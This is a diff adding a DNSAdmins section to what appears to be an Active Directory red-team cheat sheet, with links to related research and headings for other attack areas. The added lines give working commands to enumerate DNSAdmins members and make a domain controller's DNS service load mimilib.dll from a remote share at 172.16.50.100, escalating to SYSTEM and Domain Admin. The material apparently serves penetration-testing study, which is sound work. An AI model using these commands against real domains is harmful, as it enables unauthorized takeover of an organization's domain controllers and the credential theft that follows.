@@ -778,6 +778,33 @@ OR
 # DNS Admins
 https://medium.com/@esnesenon/feature-not-bug-dnsadmin-to-dc-compromise-in-one-line-a0f779b8dc83
 
+It is possible for the members of the DNSAdmins group to load arbitrary
+DLL with the privileges of dns.exe (SYSTEM).
+
+•  often the DC also serves as DNS, this will provide us escalation to DA.
+
+•  Need privileges to restart the DNS service.
+
+
+
+•  Enumerate the members of the DNSAdmis group
+
+Get-NetGroupMember -GroupName "DNSAdmins"
+
+
+Using DNSServer module (needs RSAT DNS):
+
+```dnscmd dcorp-dc /config /serverlevelplugindll
+\\172.16.50.100\dll\mimilib.dll```
+
+
+```$dnsettings = Get-DnsServerSetting -ComputerName dcorp-dc -Verbose -All```
+
+```$dnsettings.ServerLevelPluginDll = "\\172.16.50.100\dll\mimilib.dll"```
+
+```Set-DnsServerSetting -InputObject $dnsettings -ComputerName dcorp-dc -Verbose```
+
+
 # MS SQL
 # Forests and Trusts?
 https://blog.harmj0y.net/redteaming/not-a-security-boundary-breaking-forest-trusts/
